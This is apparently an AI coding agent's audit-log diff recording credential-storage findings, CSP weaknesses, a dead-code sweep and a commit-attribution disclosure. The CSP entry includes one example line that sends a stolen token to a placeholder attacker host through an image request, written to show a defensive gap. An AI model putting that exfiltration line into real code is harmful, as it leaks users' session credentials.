@@ -7132,3 +7132,682 @@ the 5s default — the same defect the T6 finding was about, one file over. Give
 
 **Verdict:** VERIFIED — and the transferable lesson is the method, not the patches: when the same
 defect class survives three fixes, replace the oracle rather than the increment.
+
+---
+
+## 2026-08-18 — W5/G5 step one: CI guard for `src/shell/mobile/MobileShellContext.ts`
+
+**Claim:** The free-text rule "the dead-code sweep must not touch `MobileShellContext.ts`" is now a
+CI assertion (`tests/shell-mobile-context-liveness-guard.test.ts`) that fails both if the file is
+deleted while production importers remain, and if the importer set drifts. No production code changed.
+
+**Evidence — the premise, verified rather than trusted.** The dispatch claimed four production
+importers; `rg` over the whole repo (excluding `node_modules`/`dist`/`.git`) for the specifier in a
+module-resolution position returns exactly four `src/` files, unchanged from the claim:
+- `src/pages/alerts.tsx:2` · `src/pages/equipment-detail.tsx:2` · `src/pages/equipment-list.tsx:1` ·
+  `src/pages/scan.tsx:2` — all `import { useMobileShellContext } from "@/shell/mobile/MobileShellContext"`.
+- The test surface is separate and larger: `tests/mobile-shell.test.tsx:23` imports it directly and
+  five files `vi.mock` the path (`return-damaged`, `readiness-badge-surfaces`,
+  `equipment-detail-shift-error`, `equipment-detail-dock-return-mount`,
+  `equipment-detail-touch-targets`). Ten path references in total; **four** is the production count.
+- `src/shell/mobile/MobileShellContext.ts:1-5` is a re-export of `@/native/NativeShellContext`
+  (`src/native/NativeShellContext.ts:8-9`), so deleting it breaks four live pages.
+
+**Evidence — the guard is non-vacuous, proven both ways, run in isolation so the RED is attributable
+to this test and not to the six pre-existing tests that also touch the path:**
+- `rm src/shell/mobile/MobileShellContext.ts` → `pnpm test -- tests/shell-mobile-context-liveness-guard.test.ts`
+  → `Tests 1 failed | 2 passed (3)`, failing on *"is not deleted while production code still imports it"*
+  and naming all four importers in the message.
+- Restore, then drift one importer (`src/pages/alerts.tsx` repointed to
+  `@/native/NativeShellContext` with an alias, so the file still compiles) →
+  `Tests 1 failed | 2 passed (3)`, failing on *"keeps exactly the production importers on record"*
+  with `expected 4 / actual 3`. **This is the case with no other coverage** — the alias still
+  resolves, so nothing else in the suite notices importers leaving one at a time.
+- `git checkout --` both files → `git status --short` shows only the new test file, i.e. the restore
+  is byte-identical → `Tests 3 passed (3)`.
+
+**Evidence — no collateral damage:**
+- `pnpm test -- tests/mobile-shell.test.tsx tests/return-damaged.test.tsx tests/readiness-badge-surfaces.test.tsx tests/equipment-detail-shift-error.test.tsx tests/equipment-detail-dock-return-mount.test.tsx tests/equipment-detail-touch-targets.test.tsx tests/shell-mobile-context-liveness-guard.test.ts`
+  → `Test Files 7 passed (7) · Tests 38 passed (38)`.
+- `npx tsc --noEmit` → exit 0.
+
+**PARTIAL — the full suite is not a usable signal in this worktree right now, and that is an
+environment finding, not a result.** `pnpm test` gave `12 failed (730 files)` on one run and
+`44 failed (731 files)` on the next with no source change between them beyond restoring one import
+line. Two independent causes, both external: (1) 20 failures trace to
+`column "signup_join_code" of relation "vt_clinics" does not exist` — the shared local Postgres is
+mid-migration under the concurrent RLS workflow that owns `migrations/**`; (2) timer-window tests
+flake under three concurrent workflows — `tests/return-damaged.test.tsx` failed inside the full run
+and then passed three times standalone **with the new file present** (alone, and paired with it), so
+the flake is load-induced and not caused by this change. Test totals reconcile exactly:
+`6625 → 6628 (+3)`, `730 → 731 files (+1)`.
+
+**Verdict:** VERIFIED for the guard (RED/RED/GREEN in isolation, typecheck clean);
+PARTIAL for full-suite green, with the two external causes named above.
+
+## 2026-08-18 — G3 localStorage credentials: complete read/write map, premise inversion, and the server change the fix requires (chore/w5-vettrack-residue)
+
+**Claim:** No production code changed. This entry records three things established by evidence:
+(1) the task's "corrected file target" for finding J10 is **inverted** — the writer is
+`clerk-native-instance.ts`, not `native-clerk-session-token.ts`; (2) there are **three**
+long-lived credentials in `localStorage`, not the two named — the third
+(`vt_session`, the user's API bearer JWT) is the most dangerous and was unlisted; (3) neither
+named credential can be relocated to safer client storage — one is architecturally barred from
+cookies, the other needs a server change, specified below.
+
+**Evidence — the J10 "correction" is backwards (this is the finding, not a detour).**
+- `src/lib/clerk-native-instance.ts:38` — `window.localStorage.setItem(CLERK_CLIENT_JWT_STORAGE_KEY, jwt)`.
+  `rg -n "CLERK_CLIENT_JWT_STORAGE_KEY"` over the repo returns this as the **only** `setItem`.
+- `src/lib/native-clerk-session-token.ts:4` **declares** the key; `:25` **reads** it
+  (`window.localStorage.getItem`). It never writes. Its own docblock at `:3` names the writer:
+  *"Persisted by `createNativeClerkInstance`"* — which lives at `clerk-native-instance.ts:44`.
+- Proven at runtime, not by reading: a throwaway probe mocked `@clerk/clerk-js`, called
+  `createNativeClerkInstance("pk_test_probe")`, asserted exactly one `__unstable__onAfterResponse`
+  hook was registered, and replayed a FAPI response carrying an `authorization` header. The JWT
+  landed in `localStorage` → `AssertionError: expected 'eyJ.CLIENT_JWT_SECRET.sig' not to contain
+  'CLIENT_JWT_SECRET'`. The hook that wrote it was registered by `clerk-native-instance.ts`.
+  A one-writer-per-file rule following the "correction" would have handed an agent a file that
+  cannot fix the defect.
+
+**Evidence — complete read/write map (all three credentials).**
+- `vt_display_token` (`vtd_` device bearer) — key `src/lib/display-token-store.ts:21`.
+  Write `:49` (+ clinic id `:50`). Reads `:37` (`getStoredDisplayToken`), `:44`. Clear `:62-63`.
+  Consumers: `src/lib/auth-fetch.ts:124-137` (attaches `x-display-token`, and on 401 marks the
+  revoked notice, clears, redirects to `/board/pair`); `src/lib/realtime.ts:899` (display SSE via
+  fetch) and `:969`; `src/app/routes.tsx:118` (`hasStoredDisplayToken()` decides whether `/board`
+  drops `AuthGuard`); `src/pages/board-pair.tsx:18`. Server side:
+  `server/middleware/auth.ts:823` (`extractDisplayToken`), `:856` (`resolveDisplayAuth`).
+- `__vt_clerk_client_jwt` — key `src/lib/native-clerk-session-token.ts:4`.
+  **Write** `src/lib/clerk-native-instance.ts:38` (only). Reads `clerk-native-instance.ts:30`
+  (attached as the `authorization` header at `:53`) and `native-clerk-session-token.ts:25`.
+  Reached only from `src/main.tsx:243-245`, gated on `isCapacitorNative()`.
+- **`vt_session` — third credential, not named in the task, higher value than either.**
+  `src/lib/offline-session.ts:15` key, `:69` `safeStorageSetItem(SESSION_KEY, JSON.stringify(snapshot))`
+  with the default kind `"local"` (`src/lib/safe-browser.ts:89`). The snapshot includes `token`
+  (`offline-session.ts:9`) — the same Clerk **session** JWT set as `bearerToken` at
+  `src/hooks/use-auth.tsx:435` and persisted at `:440-447`, i.e. the bearer every `/api` route
+  accepts. Probe → `AssertionError`, dump:
+  `{"userId":"u1",...,"token":"eyJhbGciOiJI.USER_BEARER_SECRET.sig","tokenExp":0,...,"clinicId":"clinic-A"}`
+  — the token plus email, name, role and clinic id. Dev-bypass stores `""` (`use-auth.tsx:214`);
+  Clerk mode stores the real JWT.
+- Sweep for a fourth: `rg -n "localStorage\.setItem|safeStorageSetItem\("` across `src/`
+  (tests excluded) returns 32 hits; every other one is UI state, locale, cursor, or a dismissal
+  flag. Three credentials, no more.
+
+**Evidence — the exposure, as failing output rather than assertion.** Throwaway probes (run, then
+deleted; `git status --short` clean afterwards) asserting each credential is *not* readable by
+same-origin script:
+- `expected 'vtd_super_secret_device_credential|clinic-A' not to contain 'vtd_super_secret_device_credential'`
+- `expected 'eyJ.CLIENT_JWT_SECRET.sig' not to contain 'CLIENT_JWT_SECRET'`
+- `expected '{...,"token":"eyJhbGciOiJI.USER_BEARER_SECRET.sig",...}' not to contain 'USER_BEARER_SECRET'`
+
+**Verdict per credential — why "move it" is not available.**
+1. `__vt_clerk_client_jwt` — **cannot be a cookie at all**, and the module's own docblock is the
+   primary source: `clerk-native-instance.ts:6-23` records that cookie-based clerk-js *is* the
+   failure this module exists to route around (SFSafariViewController cannot present the
+   WKWebView's cookies, so `/v1/oauth_callback` dies with `authorization_invalid`; the fix is
+   `_is_native=1` + the JWT in the `Authorization` header). Making it httpOnly re-breaks native
+   OAuth by construction. **Pre-empting the likely "hardening":** Capacitor Preferences /
+   SecureStorage is JS-reachable from the same WebView, so against XSS it is exactly as weak as
+   `sessionStorage` — it buys device-at-rest protection (Keychain/Keystore) and *no* XSS
+   protection. Do not bank an XSS win on it.
+2. `vt_display_token` — fixable, but **not client-side**. `sessionStorage` is both no safer against
+   XSS *and* actively breaks the acceptance bar: a kiosk power-cycle starts a new session and the
+   pairing is gone. The property wanted is *usable-but-not-exfiltratable*, and a browser offers
+   exactly two ways to get it — an httpOnly cookie, or a non-extractable `CryptoKey`
+   (`extractable: false`) in IndexedDB signing a DPoP-style proof. Both require the server to
+   accept something other than a bearer read out of JS. Cookie is the cheap one.
+3. `vt_session` — same shape as (2) and strictly higher priority, since it is a **user** bearer for
+   every `/api` route, not a board-scoped device token. Out of this task's named scope; reported,
+   not touched.
+
+**The server change, specified (display token).**
+- `POST /api/display/pair/claim` (`server/routes/display.ts`) additionally sends
+  `Set-Cookie: vt_display=<token>; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=<years>`.
+  `SameSite=Strict` is required, not optional: an httpOnly cookie is ambient authority, and Lax
+  would let a cross-site top-level GET ride it. A kiosk never follows external links, so Strict
+  costs nothing.
+- **`server/middleware/auth.ts` need not be touched** (it is owned by the concurrent audit
+  workflow this session). A new middleware registered before route wiring copies the cookie into
+  `req.headers["x-display-token"]` when the header is absent, leaving `extractDisplayToken`
+  (`auth.ts:823`) and `resolveDisplayAuth` (`:856`) byte-identical. `server/routes/display.ts` and
+  `server/index.ts` are on neither workflow's owned list.
+- **Revocation moves to the server.** Today `src/lib/auth-fetch.ts:130-137` clears the credential
+  itself on 401. With httpOnly the client cannot; the 401 path must `Set-Cookie ... Max-Age=0` or a
+  revoked kiosk loops forever between `/board` and `/board/pair`.
+- **`/board` needs a client-readable marker.** `src/app/routes.tsx:118` uses
+  `hasStoredDisplayToken()` to drop `AuthGuard`. An httpOnly cookie is unreadable, so a non-secret
+  `vt_display_paired=1` (or the already-stored clinic id) has to carry that decision — and the spec
+  must state the new failure mode: **marker present + cookie expired/cleared → the kiosk renders
+  unauthenticated**. That is the case that breaks "pair, auto-reload, hold during a Code Blue".
+- Client half touches `src/lib/api.ts:397` (the claim fetch), **owned by the audit workflow** →
+  reported, not edited.
+
+**Why nothing was implemented here.** The acceptance bar is a browser kiosk that pairs, survives
+`useBoardAutoReload`'s full-page reload (`src/board/useBoardAutoReload.ts:73-82`, which defers while
+a Code Blue is active), and holds through an emergency. Nothing in this worktree can exercise that,
+and the full suite is not a usable signal here (see the 2026-08-17 entry: shared Postgres mid-migration
+under the concurrent RLS workflow, plus load-induced timer flake). A half-landed cookie path —
+`Set-Cookie` without the shim, or the shim without the marker — breaks pairing outright, which is
+strictly worse than the present exposure. Specification is the deliverable the task itself named
+for this branch; implementation needs a browser.
+
+**Verification (this branch):**
+- `git status --short` → empty before and after the probes; only this log entry is committed.
+- `npx tsc --noEmit` → exit 0.
+- `pnpm test -- tests/display-token-store.test.ts tests/display-token-header.test.ts tests/display-token-allow.test.ts tests/display-token-deny-list.test.ts tests/native-clerk-session-token.test.ts tests/board-pair.test.tsx`
+  → `Test Files 6 passed (6) · Tests 36 passed (36)`.
+
+**Verdict:** VERIFIED for the map, the J10 inversion, the third credential, and the
+cannot-relocate-client-side conclusion (all backed by failing/passing command output above).
+PARTIAL for the task as written — the credentials were **not** moved; the required server change is
+specified instead, per the task's own escape clause.
+
+## 2026-08-18 — G3 follow-on: the CSP does not mitigate the localStorage exposure, and does not contain exfiltration (chore/w5-vettrack-residue)
+
+**Claim:** No code changed. Applying the `security-reviewer` checklist to the credential surface
+found that the production CSP neither prevents the XSS that reads those credentials nor stops the
+attacker sending them out. This raises the severity of the previous entry and removes "the CSP
+protects us" as an available answer.
+
+**Tooling note (a known hole, stated rather than skipped):** `verify-security` / `verify-quality`
+do not exist despite `~/.claude/rules/ccg-skills.md` listing them. The
+`security-reviewer` **agent** does exist — `.claude/agents/security-reviewer.md:1-6`, project-scoped
+— but this session has no subagent-dispatch tool (`ListAgents` returns no dispatchable local agent
+and there is no `Task` tool), so its workflow was applied by hand rather than delegated. Flagged so
+the result is not read as an agent-verified review.
+
+**Evidence:**
+- `server/index.ts:127-133` (`scriptSrc`) and `:135-141` (`scriptSrcElem`) both list
+  `"'unsafe-inline'"` **unconditionally** — only `'unsafe-eval'` is gated behind `!isProduction`
+  (`...(isProduction ? [] : ["'unsafe-eval'"])`). Production therefore permits injected inline
+  script, so the CSP is not a control against the XSS that reads `localStorage`.
+- `server/index.ts:159` — `imgSrc: ["'self'", "data:", "https:"]`. `connectSrc` (`:143-158`) is
+  correctly narrow (`'self'` + Clerk hosts), so `fetch()` exfiltration is blocked — but a stolen
+  token can still leave over `new Image().src = "https://<attacker>/?t=" + token`, which `imgSrc:
+  https:` permits. Blocking `connectSrc` alone does not contain exfiltration.
+- Consequence for the previous entry: the mitigation offered there for `__vt_clerk_client_jwt`
+  ("it cannot be relocated, so rely on preventing XSS") holds on the Capacitor origin, where the
+  bundle is local, but **not** on the web origin that serves `/board`. The display token's httpOnly
+  migration is the load-bearing fix, not a nicety.
+- Scope discipline: `server/index.ts` is on neither concurrent workflow's owned list, so tightening
+  the CSP is landable — but it is a separate change with its own blast radius (Clerk injects inline
+  script; a nonce/hash rollout needs browser verification), and this branch has no browser. Not
+  attempted.
+
+**Verification:** `git status --short` → only this log entry. `npx tsc --noEmit` → exit 0 (unchanged;
+no source touched).
+
+**Verdict:** VERIFIED for both CSP readings (`file:line` quoted above). NOT ACTED ON — CSP hardening
+is specified as follow-on work, not performed.
+
+## 2026-08-18 — G3 correction + reprioritisation: which origin each credential lives on, and why `vt_session` is the headline (chore/w5-vettrack-residue)
+
+**Claim:** No code changed. This entry **supersedes one sentence** of the 2026-08-18 CSP entry and
+re-ranks the three credentials. The CSP entry implied the native shell is the safer of the two
+origins; it is not — the Capacitor WebView receives **no CSP at all**. And the third credential
+(`vt_session`) is a live, replayable user bearer, not an identity snapshot, so it outranks both
+credentials the task named.
+
+**Correction — origin per credential, and which CSP actually applies.**
+- Helmet's CSP (`server/index.ts:124-179`) is an **HTTP response header from the Express app**. It
+  therefore applies to the web origin that serves `/board` and the PWA — where `vt_display_token`
+  and `vt_session` live.
+- `__vt_clerk_client_jwt` lives **only** on `capacitor://localhost` (`src/main.tsx:243-245` gates
+  `createNativeClerkInstance` on `isCapacitorNative()`). The bundled shell loads its document from
+  local assets, not from the API host, so it never receives that header — and there is no fallback:
+  `rg -n -i "content-security-policy" index.html` → no match; `ios/App/App/Info.plist` → no match;
+  `capacitor.config.ts` sets no CSP (only an optional `server.url` for live-reload). **The native
+  WebView runs with no CSP.**
+- Net: the earlier sentence *"holds on the Capacitor origin, where the bundle is local, but not on
+  the web origin"* is withdrawn. The native origin's protection is that it ships **only local
+  bundled assets with no remote content load**, not that a CSP constrains it. That is a real but
+  different property, and it does not survive `CAPACITOR_SERVER_URL` being set (live-reload/staging,
+  `capacitor.config.ts:7-19`), which points the WebView at a remote origin.
+
+**Reprioritisation — `vt_session` is the top finding, and it is live, not inert.**
+- The restored token is fed straight back in as the API bearer: `src/hooks/use-auth.tsx:277`
+  (Clerk provider) and `:95` (dev provider) both call
+  `setAuthState({ ..., bearerToken: offlineSnapshot.token })`, and `src/lib/auth-store.ts:29-33`
+  turns that into `Authorization: Bearer <token>`. So it is a working session credential, not an
+  identity-only snapshot — that check was run precisely because "identity only" would have dropped
+  the severity sharply. It does not.
+- It is written on **every** authenticated resolve (`use-auth.tsx:440-447`), not gated behind any
+  pairing or kiosk flow, and it carries email, name, role and clinic id alongside the token.
+- It sits on the origin whose CSP permits inline script (`server/index.ts:129`) and `https:` image
+  exfil (`:159`) — i.e. the exposure and the weak CSP overlap on the *same* origin. That is the
+  combination the previous entry mis-assigned.
+- **Bounded, honestly:** `restoreOfflineSession` does enforce limits — `offline-session.ts:78`
+  rejects on `Date.now() >= tokenExp`, `:79` on a 24 h `lastActiveAt` age, `:80` on non-active
+  status. But those guard *this app's own restore path*; an attacker who reads the raw
+  `localStorage` value replays it directly against `/api` and is bounded only by the Clerk JWT's own
+  `exp`. That TTL was **not measured in this session** — stating it as short would be a claim, not
+  evidence. Measuring it is the next check before ranking severity finally.
+- Ranking, therefore: **1) `vt_session`** (user bearer + PII, web origin, no pairing gate) →
+  **2) `vt_display_token`** (device bearer, board-scoped, web origin) →
+  **3) `__vt_clerk_client_jwt`** (native origin only, no CSP but no remote content either).
+  The task named 2 and 3 and not 1.
+
+**Verification:** `git status --short` → only this log entry. `npx tsc --noEmit` → exit 0.
+Commands run for this entry: `rg -n -i "content-security-policy" index.html` → no match;
+`rg -n -i "content-security" ios/App/App/Info.plist` → no match;
+`sed -n '84,100p;265,300p' src/hooks/use-auth.tsx` → `bearerToken: offlineSnapshot.token` at both sites.
+
+**Verdict:** VERIFIED for the origin correction and for `vt_session` being a live bearer.
+PARTIAL for its severity ceiling — the Clerk JWT `exp` window is unmeasured and named as the next check.
+
+## 2026-08-18 — G5/L6 dead-code sweep: 12 files deleted, and three "stubs" re-classified (chore/w5-vettrack-residue)
+
+**Claim:** Twelve provably-unreachable files removed from `src/`. The three flagged "always returns
+empty / no-op / injects NULL" modules were traced to their call sites first; **two of the three are
+live stubs feeding real code, not dead code**, and were left in place with the defect documented.
+
+**Skills:** `tech-debt`, `vettrack-codebase-relevance-audit`. Tooling hole restated: `verify-security`
+/ `verify-quality` do not exist despite `~/.claude/rules/ccg-skills.md` listing them; no
+subagent-dispatch tool is available in this session, so the `security-reviewer` agent could not be
+delegated to. Not applicable to this change (no auth/credential/tenancy surface touched) but stated
+rather than skipped.
+
+### RED (before)
+
+`pnpm knip` → exit 1, `Unused files (132)`, of which **22** are under `src/` + `shared/`:
+
+```
+shared/index.ts                         src/infrastructure/platform/index.ts
+src/components/alerts/AlertCard.tsx     src/lib/camera.ts
+src/components/home/ShiftProgressHero.tsx  src/lib/query-keys/registry.ts
+src/components/layout/Sidebar.tsx       src/native/index.ts
+src/core/entities/index.ts              src/native/NativeScreen.tsx
+src/core/index.ts                       src/shared/index.ts
+src/core/use-cases/index.ts             src/shell/desktop/index.ts
+src/desktop/index.ts                    src/shell/index.ts
+src/infrastructure/api/index.ts         src/shell/mobile/index.ts
+src/infrastructure/auth/index.ts        src/shell/mobile/MobilePageHeader.tsx
+src/infrastructure/db/index.ts
+src/infrastructure/index.ts
+```
+
+### GREEN (after)
+
+- `pnpm knip` → `Unused files (120)`; src/+shared subset **22 → 10**. Exactly the 12 deleted paths
+  disappeared and **no new unused entry appeared** — no cascade.
+- `pnpm typecheck` (frontend + `tsconfig.server.json`) → **exit 0**.
+- `pnpm test -- tests/shell-mobile-context-liveness-guard.test.ts tests/mobile-shell.test.tsx
+  tests/return-damaged.test.tsx tests/readiness-badge-surfaces.test.tsx
+  tests/equipment-detail-shift-error.test.tsx tests/equipment-detail-dock-return-mount.test.tsx
+  tests/equipment-detail-touch-targets.test.tsx` → **Test Files 7 passed (7) / Tests 38 passed (38)**.
+  The `MobileShellContext` liveness guard passes: the deleted `src/shell/mobile/index.ts` re-exports
+  from `@/native/NativeShellContext`, not from `@/shell/mobile/MobileShellContext`, so it never
+  matched the guard's specifier regex and `PRODUCTION_IMPORTERS` is unchanged.
+- `pnpm depcruise:check` → exit 0, `no dependency violations found (1000 modules, 5201 dependencies)`.
+  All 12 paths pre-checked against `.dependency-cruiser-known-violations.json`: 0 hits each.
+- `pnpm architecture:cycles` → exit 0, matches baseline.
+- `pnpm build` → exit 0, `✓ built in 11.78s`.
+- Dangling-reference grep for every deleted specifier across `src/ server/ tests/ shared/` → exit 1
+  (no matches).
+
+### Deleted (12) — zero importers by import-position grep, not by mention-grep
+
+`src/lib/camera.ts` · `src/native/NativeScreen.tsx` · `src/shared/index.ts` ·
+`src/core/index.ts` · `src/core/entities/index.ts` · `src/core/use-cases/index.ts` ·
+`src/shell/index.ts` · `src/shell/desktop/index.ts` · `src/shell/mobile/index.ts` ·
+`src/shell/mobile/MobilePageHeader.tsx` · `src/desktop/index.ts` · `src/native/index.ts`
+
+`src/desktop/index.ts` and `src/native/index.ts` were reachable *only* from `src/shell/index.ts:3-4`,
+so they are dead only once the shell barrels go — deleted in the same commit, not a later pass.
+
+### Three "stubs" — traced before touching. Two are live defects, not dead code.
+
+**1. `server/lib/dispense-order-validation.ts` — LIVE STUB. `enforce` mode can never deny.**
+`evaluateDispenseAgainstOrders` unconditionally returns `{ orphanLines: [] }`
+(`dispense-order-validation.ts:35-37`). It has **two production call sites**:
+- `server/lib/authority/enforcement/clinical-invariant.evaluator.ts:124` —
+  `const { orphanLines } = await evaluateDispenseAgainstOrders(ctx.tx, {…})`. This is the
+  `clinical-invariant` evaluator family. Because `orphanLines` is always empty, the family can
+  **never** return `deny`, in `shadow` *or* `enforce`. A clinic set to `enforce` gets `allow` on
+  every dispense while reporting an enforcing posture. The documented `422 ORPHAN_DISPENSE_BLOCKED`
+  path (CLAUDE.md, "Authority + enforcement") is unreachable at runtime.
+- `server/routes/containers.ts:640` — the legacy pre-Phase-5 hard block
+  `if (orphanLines.length > 0 && !body.bypassReason)` at `:646`. Never fires.
+
+Not dead code, not deletable: the file's other export `loadInventoryItemLabelCode` and its types are
+imported by `server/services/dispense.service.ts:16-19,34-37` and `server/routes/containers.ts:24-42`,
+and ~6 test files assert the evaluator's behaviour through a mock of this function — the mock returns
+non-empty `orphanLines`, so **the tests exercise a path production cannot reach**. Left in place;
+this is an enforcement-semantics decision, not a sweep.
+
+**2. `server/queues/inventory-deduction.queue.ts` / `server/workers/inventory-deduction.worker.ts`
+— dead in production, and the note protecting them is factually wrong.**
+`inventoryDeductionQueue.add` is `return;` (`inventory-deduction.queue.ts:17-23`);
+`processInventoryDeductionJob` is `return;` and `startInventoryDeductionWorker` only warns
+(`inventory-deduction.worker.ts:4-13`). Grep for `inventoryDeductionQueue` across the repo returns
+**zero production importers** — only tests.
+
+Two on-record justifications for keeping them are **stale**:
+- `TASKS.md:224` — "NOT dead — `server/services/dispense.service.ts:614` enqueues it". It does not.
+  `dispense.service.ts:614` calls `enqueueDispenseInventoryDeduction`, a **local** function declared
+  at `dispense.service.ts:639` that does inline `db.transaction` stock decrements. Same-word name,
+  different symbol; the queue module is never imported by that file.
+  `docs/audit/RELEVANCE_BASELINE.md:70` repeats the same claim.
+- `server/jobs/enqueue.ts:117-118` — "`inventoryDeductionQueue.add` in inventory-deduction.queue.ts
+  delegates `inventory-deduction` (1c-2)". It delegates nothing; `add` returns immediately without
+  calling `enqueueJob`.
+
+**Not deleted anyway.** `docs/design/program-plan.md:285` records a standing owner decision that the
+no-op is *intentionally preserved* post-migration-143, and the repo's own Removal Protocol classes
+this as a behaviour change rather than a relevance cleanup. A wrong justification does not void the
+decision — it means the justification needs correcting. Reported, not acted on.
+
+**3. `server/routes/equipment/equipment-linked-animal-select.ts` — LIVE STUB feeding a permanently
+dead UI branch.** It injects `sql\`NULL\`` for `linkedAnimalId` / `linkedAnimalName` and is spread
+into three live read handlers: `get-equipment-list.ts:126`, `get-equipment-by-id.ts:49`,
+`get-my-equipment.ts:48`. The second possible producer is also dead end-to-end:
+- `src/lib/api/equipment.ts:437-443` writes those fields into the Dexie cache, but only
+  `if ("linked" in result && result.linked && result.animal)`.
+- `server/routes/equipment.ts:836-839` responds `{ linked: result.linked, roomId }` — **no `animal`
+  field is ever sent**.
+- `server/lib/equipment-seen.ts:9` types the success case as `{ ok: true; linked: false; … }` — a
+  `false` **literal** — and `:37` returns `linked: false` unconditionally.
+
+So both branches are unreachable, and the UI that consumes them can never render:
+`src/pages/equipment-list.tsx:1253` and `src/pages/room-radar.tsx:251` both guard on
+`{eq.linkedAnimalName && …}` to show `t.equipmentList.linkedInUse(…)`. That badge is dead, and the
+i18n key is orphaned. The `linked: true` arm of `EquipmentSeenResponse`
+(`src/types/equipment.ts:288-295`) is a phantom variant. Not deleted — three live handlers and the
+public response shape depend on it; removing it is an API-shape change.
+
+### Premise corrections (task brief vs. the tree)
+
+- **22** unused files under `src/`+`shared/`, not 21.
+- **15** `index.ts` barrels among them, not 13 — and **none is empty**. All 15 were dumped in full.
+  `src/shared/index.ts` (a single comment line, zero exports) is the only effectively-empty one;
+  `shared/index.ts` is a 24-line public barrel; the rest re-export real modules.
+- `docs/audit/PROOF_ALIGNMENT_LOG.md:1538`'s "`src/lib/camera.ts` (6 refs)" is **stale**. Those were
+  substring matches on the word "camera" in `src/components/qr-scanner.tsx` comments. Import-position
+  grep for `lib/camera` across `src/ server/ tests/ shared/` returns zero. Deleted.
+- The `@capacitor/camera` entry in `knip.json:5` `ignoreDependencies` is indeed stale as a
+  *justification* — after this deletion, the only remaining reference to that package in TypeScript
+  is gone (`src/lib/camera.ts:30` was the last one). **The entry is kept regardless**, because the
+  package is still autolinked into both native shells: `android/capacitor.build.gradle:14`,
+  `android/capacitor.settings.gradle:11-12`, `ios/App/CapApp-SPM/Package.swift:18,33`. Dropping the
+  dependency requires a `cap sync` regeneration of `ios/`+`android/` — a build change, out of scope
+  here. Standing cost: the Camera plugin ships in both native binaries for a feature gated behind
+  `VITE_FEATURE_CAMERA` that now has no caller at all.
+
+### Kept, with reason — knip false positives
+
+- `public/sw.js` — frozen surface (CLAUDE.md, PWA build-tag + emergency cache denylist).
+- `src/lib/query-keys/registry.ts` — read **by path**, not imported:
+  `scripts/architecture/collect-query-keys.mjs:17,370`, driven by `pnpm query-keys:audit`
+  (`package.json:46`) and required by `.github/pull_request_template.md:22`.
+- `src/components/alerts/AlertCard.tsx`, `src/components/home/ShiftProgressHero.tsx`,
+  `src/components/layout/Sidebar.tsx` — reachable from `src/design-system-entry.ts:38,62,33`, the
+  entry named in `.design-sync/config.json:18`. **Gate hole worth knowing:** `tsconfig.json:26`
+  *excludes* `src/design-system-entry.ts`, so `pnpm typecheck` would stay green even if that entry
+  were broken. That exclusion is why knip flags these three, and why the flag is a false positive
+  rather than a lead.
+- `shared/index.ts` — the `@vettrack/shared` barrel, documented in its own header as the entry for
+  the external React Native migration repo. Zero **in-repo** importers is not evidence of absence
+  for a cross-repo consumer.
+- The five `src/infrastructure/**/index.ts` barrels — zero importers today, but CLAUDE.md documents
+  `src/core/` + `src/infrastructure/` as an **in-progress** hexagonal migration and each barrel's own
+  docblock states the forward intent ("so features can import from `@/infrastructure/api` without
+  depending directly on `src/lib/`"). Deleting in-flight scaffolding is a migration decision.
+  Listed as follow-up, not swept.
+- `src/shell/mobile/MobileShell.tsx`, `src/shell/mobile/MobileTabBar.tsx` — sole importers are
+  `tests/mobile-shell.test.tsx:24-25`. A file with a live test importer is not provably unreachable,
+  and rewriting a passing test to enable a deletion is outside a sweep. This is exactly the drift the
+  guard's own docstring predicts; logged as follow-up.
+
+### Ownership
+
+No file owned by a concurrent workflow was touched. `migrations/**`,
+`server/middleware/tenant-context.ts`, `server/db.ts` (RLS workflow) and
+`server/middleware/auth.ts`, `lib/i18n/**`, `src/lib/api.ts` (audit workflow) are untouched —
+confirmed by `git status --short` listing only the 12 deletions plus this log entry.
+
+### Not claimed
+
+Full-suite `pnpm test` green. Per the prior entry on this branch it is not a usable signal in this
+worktree (12 vs 44 failures across two runs with no source change; shared local Postgres is
+mid-migration under the concurrent RLS workflow, and timer tests flake under three concurrent
+workflows). The targeted 7-file run above, `pnpm typecheck`, `pnpm build`, `pnpm depcruise:check`,
+`pnpm architecture:cycles` and the knip before/after diff are the evidence offered instead.
+
+**Verdict:** VERIFIED for the 12 deletions (RED/GREEN above). VERIFIED-AS-DEFECT, not acted on, for
+`dispense-order-validation` and `equipment-linked-animal-select`. REPORTED, not acted on, for
+`inventory-deduction` — the code stays per the standing owner decision, but `TASKS.md:224`,
+`docs/audit/RELEVANCE_BASELINE.md:70` and `server/jobs/enqueue.ts:117-118` assert a call that does
+not exist.
+
+## 2026-08-18 — Disclosure: commit 0f78f20e4 carries a dead-code sweep this session did not author (chore/w5-vettrack-residue)
+
+**Claim:** Commit `0f78f20e4` is titled as a docs-only entry but its diffstat contains 12 source
+files besides `docs/audit/PROOF_ALIGNMENT_LOG.md`. Those 12 were **already staged in the index** by
+a concurrent workflow sharing this worktree when `git commit` ran; `git add` named only the log file
+and `-a` was not used, so `git commit` picked them up from the pre-existing index. Recorded here
+rather than quietly rewritten, because the alternative — `reset`/`revert` — would destroy another
+agent's in-flight work.
+
+**Evidence:**
+- `git show --stat 0f78f20e4` → `13 files changed, 118 insertions(+), 425 deletions(-)`. Mine is the
+  `118` insertions in `docs/audit/PROOF_ALIGNMENT_LOG.md`. Not mine, all deletions:
+  `src/lib/camera.ts` (318), `src/shell/mobile/MobilePageHeader.tsx` (64),
+  `src/native/NativeScreen.tsx` (19), and nine barrel `index.ts` files under
+  `src/core/`, `src/desktop/`, `src/native/`, `src/shared/`, `src/shell/`.
+- `git status --short` at session start (before any work) → **empty**. The staging happened between
+  that check and the commit, i.e. concurrently.
+- The two later commits (`568bd4e2a`, `f5acc6199`) are clean: `1 file changed` each,
+  `docs/audit/PROOF_ALIGNMENT_LOG.md` only.
+- Still-uncommitted and left untouched, also not this session's: `M package.json`
+  (`"xlsx": "^0.18.5"` → `"0.18.5"`) and `?? tests/xlsx-write-only-guard.test.ts`.
+
+**Non-destructive check that the swept tree is not broken:**
+- `npx tsc --noEmit` → exit 0 (run after all three commits).
+- `rg -n "lib/camera" src/ server/ tests/` → no match, so the deleted module has no dangling importer.
+
+**Not done, deliberately:** no `reset`, no `revert`, no `amend`. The sweep is preserved inside
+`0f78f20e4` rather than lost; nothing is pushed and no PR is open, so the owning workflow can still
+re-split it. Attribution is corrected here instead of in git history.
+
+**Verdict:** VERIFIED — diffstat, start-of-session `git status`, reflog timestamps
